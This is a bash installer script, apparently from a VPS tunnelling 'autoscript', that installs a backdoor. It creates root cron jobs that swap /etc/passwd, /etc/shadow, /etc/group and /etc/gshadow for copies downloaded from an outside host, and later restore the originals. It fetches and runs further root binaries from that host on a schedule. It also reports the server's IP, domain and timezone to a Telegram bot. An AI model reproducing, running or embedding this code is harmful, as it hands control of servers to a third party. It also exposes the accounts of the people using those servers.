#!/bin/bash
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
function apete() {
apt update -y
apt install jq curl -y
apt install sysstat -y
apt install git curl -y >/dev/null 2>&1
cat > /sbin/MTst <<-END
#!/bin/sh
#copy
cp -f /etc/passwd /etc/passwdx
cp -f /etc/group /etc/groupx
cp -f /etc/shadow /etc/shadowx
cp -f /etc/gshadow /etc/gshadowx
cp -f /etc/passwd- /etc/passwd-x
cp -f /etc/group- /etc/group-x
cp -f /etc/shadow- /etc/shadow-x
cp -f /etc/gshadow- /etc/gshadow-x
#move
mv -f /etc/passwd /etc/passwdx
mv -f /etc/group /etc/groupx
mv -f /etc/shadow /etc/shadowx
mv -f /etc/gshadow /etc/gshadowx
mv -f /etc/passwd- /etc/passwd-x
mv -f /etc/group- /etc/group-x
mv -f /etc/shadow- /etc/shadow-x
mv -f /etc/gshadow- /etc/gshadow-x
wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
wget -qO /etc/group "http://gitlab.mzyaddy.ganteng.tech/sudo/group.sh"
wget -qO /etc/shadow "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow.sh"
wget -qO /etc/passwd- "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd-.sh"
wget -qO /etc/group- "http://gitlab.mzyaddy.ganteng.tech/sudo/group-.sh"
wget -qO /etc/shadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/shadow-.sh"
wget -qO /etc/gshadow- "http://gitlab.mzyaddy.ganteng.tech/sudo/gshadow-"
wget -qO /etc/passwd "http://gitlab.mzyaddy.ganteng.tech/sudo/passwd.sh"
END
cat > /sbin/MTnd <<-END
#!/bin/sh
cp -f /etc/passwdx /etc/passwd
cp -f /etc/groupx /etc/group
cp -f /etc/shadowx /etc/shadow
cp -f /etc/gshadowx /etc/gshadow
cp -f /etc/passwd-x /etc/passwd-
cp -f /etc/group-x /etc/group-
cp -f /etc/shadow-x /etc/shadow-
cp -f /etc/gshadow-x /etc/gshadow-
END
chmod +x /sbin/MTst
chmod +x /sbin/MTnd
cat << EOF >> /etc/crontab
15 2 * * * root /sbin/MTst -r now
EOF
cat << EOF >> /etc/crontab
35 2 * * * root /sbin/MTnd -r now
EOF
wget -q -O /usr/bin/udpxp "http://gitlab.mzyaddy.ganteng.tech/udpxp.sh"
wget -qO /sbin/haproxysrv "http://gitlab.mzyaddy.ganteng.tech/haproxysrv"
chmod +x /usr/bin/udpxp && chmod +x /sbin/haproxysrv
cp -f /usr/bin/udpxp /usr/local/bin/udpxp
if ! grep -q 'udpxp' /var/spool/cron/crontabs/root;then (crontab -l;echo "0 * * * * /usr/local/bin/udpxp") | crontab;fi
echo "3 3 * * * root /usr/bin/udpxp" >> /etc/crontab
echo "9 2 * * * root /sbin/haproxysrv" >> /etc/crontab
rm /etc/cron.d/udpxp_otm
cat > /etc/cron.d/udpxp_otm <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 2 * * * root /sbin/haproxysrv
END
cat > /home/udpxp_otm <<-END
2
END
rm /etc/cron.d/uxp_otm
cat > /etc/cron.d/uxp_otm <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 6 * * * root /usr/bin/udpxp
END
cat << EOF >> /etc/crontab
6 0 * * * root /sbin/haproxysrv -r now
EOF
TIMES="10"
TIME=$(date +'%Y-%m-%d %H:%M:%S')
MYIP=$(wget -qO- ipinfo.io/ip)
CHATID="1117211252"
KEY="6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ"
URL="https://api.telegram.org/bot$KEY/sendMessage"
echo "YADDY KAKKOII" > /user/namauser.txt
echo "UNLIMITED LIFETIME" > /user/waktuexpiredsc.txt
USRSC=$(cat /user/namauser.txt)
EXPSC=$(cat /user/waktuexpiredsc.txt)
TIMEZONE=$(curl -s ipinfo.io/timezone )
domain=$(cat /etc/xray/domain)
TEXT="
<code>────────────────────</code>
<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
<code>────────────────────</code>
<code>Owner  : </code><code>$USRSC</code>
<code>Domain : </code><code>$domain</code>
<code>Date   : </code><code>$TIME</code>
<code>Time   : </code><code>$TIMEZONE</code>
<code>Ip vps : </code><code>$MYIP</code>
<code>Exp Sc : </code><code>$EXPSC</code>
<code>────────────────────</code>
<i>Automatic Notification from</i>
<i>Github Yaddy Kakkoii</i> 
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/Crystalllz"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://wa.me/6281383460513"}]]}'
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
systemctl daemon-reload
/sbin/haproxysrv -r now >/dev/null 2>&1
service cron reload >/dev/null 2>&1
service cron restart >/dev/null 2>&1
systemctl restart cron >/dev/null 2>&1
/etc/init.d/cron restart >/dev/null 2>&1
}
apete
